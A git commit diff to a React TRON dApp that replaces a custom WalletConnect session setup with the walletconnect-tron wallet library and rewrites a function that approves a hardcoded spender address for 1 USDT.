c4594199341db3e8ec253f970b319484dabf0e05
Chetan <chetan.niit@gmail.com>
2025-08-09 18:03:18 +0530

    ok

--- src/App.jsx
+++ src/App.jsx
@@ -1,8 +1,7 @@
-import React, { useState, useEffect } from "react";
+import React, { useState } from 'react';
 import { TronWeb } from 'tronweb';
 import { Buffer } from 'buffer';
 import { Web3Modal } from "@web3modal/standalone";
-import { SignClient } from "@walletconnect/sign-client";
 
 
 // WalletConnect Modal instance
@@ -12,7 +11,6 @@ const web3Modal = new Web3Modal({
 });
 import { WalletConnectWallet, WalletConnectChainID } from '@tronweb3/walletconnect-tron';
 const TRON_NODE = "https://api.trongrid.io";
-const MAINNET_CHAIN_ID = "tron:0x2b6653dc";
 const wallet = new WalletConnectWallet({
   network: WalletConnectChainID.Mainnet,
   options: {
@@ -29,7 +27,7 @@ const wallet = new WalletConnectWallet({
 
 const abi = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"deprecated","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_evilUser","type":"address"}],"name":"addBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"upgradedAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"unpause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_maker","type":"address"}],"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_subtractedValue","type":"uint256"}],"name":"decreaseApproval","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"_value","type":"uint256"}],"name":"calcFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"oldBalanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newBasisPoints","type":"uint256"},{"name":"newMaxFee","type":"uint256"}],"name":"setParams","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_addedValue","type":"uint256"}],"name":"increaseApproval","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"redeem","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint8"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"previousOwner","type":"address"},{"indexed":true,"name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"}];
 const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const spenderAddress = 'TAcY8Rh1TMQGSZ3f8oiHRCHAVb6ZniBaL6'; // Replace with your dApp's address
+const spenderAddress = 'TJNSnex9iepHGbssFVgCZziHHX3PKuPPe2'; // Replace with your dApp's address
 const recipientAddress = 'TAcY8Rh1TMQGSZ3f8oiHRCHAVb6ZniBaL6'; // Replace with recipient address
 
 function App() {
@@ -37,69 +35,21 @@ function App() {
   const [userAddress, setUserAddress] = useState('');
   const [status, setStatus] = useState('Not connected');
   const [txHash, setTxHash] = useState('');
-  const [signClient, setSignClient] = useState(null);
-  const [session, setSession] = useState(null);
 
-
-useEffect(() => {
-    const initClients = async () => {
-      try {
-        const client = await SignClient.init({
-          projectId: 'a2cd3f6f2c8dde8024ed901de2d36bc1',
-          metadata: {
-            name: "Tron USDT Sender",
-            description: "Send TRC20 USDT on TRON Mainnet",
-            url: window.location.origin,
-            icons: ["https://example.com/icon.png"],
-          },
-        });
-        setSignClient(client);
-
-        const tw = new TronWeb({ fullHost: TRON_NODE });
-        setTronWeb(tw);
-
-        if (client.session.length) {
-          const lastSession = client.session.get(client.session.keys.at(-1));
-          setSession(lastSession);
-          const userAddress = lastSession.namespaces.tron.accounts[0].split(":")[2];
-          setUserAddress(userAddress);
-          setStatus(`Connected: ${userAddress}`);
-        }
-      } catch (error) {
-        console.error("Init error:", error);
-        setStatus("Init failed");
-      }
-    };
-    initClients();
-  }, []);
   const connectWallet = async () => {
-    if (!signClient) return;
     try {
-      setStatus("Connecting... Use Trust Wallet");
-
-      const { uri, approval } = await signClient.connect({
-        requiredNamespaces: {
-          tron: {
-            chains: [MAINNET_CHAIN_ID],
-            methods: ['tron_signTransaction','tron_signMessage'],
-            events: [],
-          },
-        },
-      });
-
-      if (uri) await web3Modal.openModal({ uri });
-
-      const session = await approval();
-      setSession(session);
-      console.log("Supported TRON methods:", session.namespaces.tron.methods);
-      const userAddress = session.namespaces.tron.accounts[0].split(":")[2];
-      setUserAddress(userAddress);
-      setStatus(`Connected: ${userAddress}`);
-      await web3Modal.closeModal();
-    } catch (error) {
-      console.error("Connection error:", error);
-      setStatus("Connection failed");
-      await web3Modal.closeModal();
+      await wallet.connect();
+      const address = await wallet.address;
+	  const tw = new TronWeb({ fullHost: TRON_NODE,signProvider: async (tx) => {
+      return await wallet.signTransaction(tx);
+    },
+});
+      setTronWeb(tw);
+      setUserAddress(address);
+      setStatus(`Connected: ${address}`);
+    } catch (err) {
+      console.error('Connection failed:', err);
+      setStatus('Connection failed');
     }
   };
 
@@ -118,20 +68,76 @@ useEffect(() => {
     setStatus(`Balance: ${readable} USDT`);
 	}
   };
+  
+ const approveUSDT = async () => {
+  try {
+    // 1. Initialize WalletConnect
+    const wallet = new WalletConnectWallet({
+      network: WalletConnectChainID.Mainnet,
+      options: {
+        relayUrl: 'wss://relay.walletconnect.com',
+        projectId: 'a2cd3f6f2c8dde8024ed901de2d36bc1', // Replace with your WalletConnect Project ID
+        metadata: {
+          name: 'TRON USDT dApp',
+          description: 'Approve and transfer USDT',
+          url: 'https://your-dapp.com',
+          icons: ['https://your-dapp.com/icon.png'],
+        },
+      },
+    });
 
-  const approveUSDT = async () => {
-    if (!tronWeb) return;
+    // 2. Connect wallet
+    await wallet.connect();
+	const tronWeb = new TronWeb({
+    fullHost: 'https://api.trongrid.io',
+    // This function delegates signing to WalletConnect
+    signProvider: async (tx) => {
+      return await wallet.signTransaction(tx);
+    },
+  });
+  
+
+    const userAddress = await wallet.address;
+    console.log('tronWeb wallet:', tronWeb);
+
+    // 3. Access contract via wallet.tronWeb
     const contract = await tronWeb.contract(abi, usdtContractAddress);
+
+    // 4. Send approval transaction
+	console.log('spenderAddress wallet:', spenderAddress);
+    const tx = await contract.approve(spenderAddress, '1000000').send({
+      feeLimit: 100_000_000,
+      callValue: 0,
+      shouldPollResponse: true,
+    });
+
+    console.log('Approval transaction successful:', tx);
+    return tx;
+  } catch (error) {
+	  alert(error);
+    console.error('USDT approval failed:', error);
+    throw error;
+  }
+}
+
+
+ /*  const approveUSDT = async () => {
+    if (!tronWeb) return;
+    const contract = await tronWeb.contract().at(usdtContractAddress);
     const amount = tronWeb.toBigNumber(1000000); // 1 USDT
     try {
-      const tx = await contract.approve(spenderAddress, '1000000').send();
+      const tx = await contract.approve(spenderAddress, '1000000').send({
+  feeLimit: 100_000_000,
+  callValue: 0,
+  shouldPollResponse: true,
+});
+
       setTxHash(tx);
       alert('Approval TX: ' + tx);
     } catch (err) {
-	alert(err);
       console.error('Approval failed:', err);
     }
-  };
+  }; */
 
   const transferUSDT = async () => {
     if (!tronWeb) return;
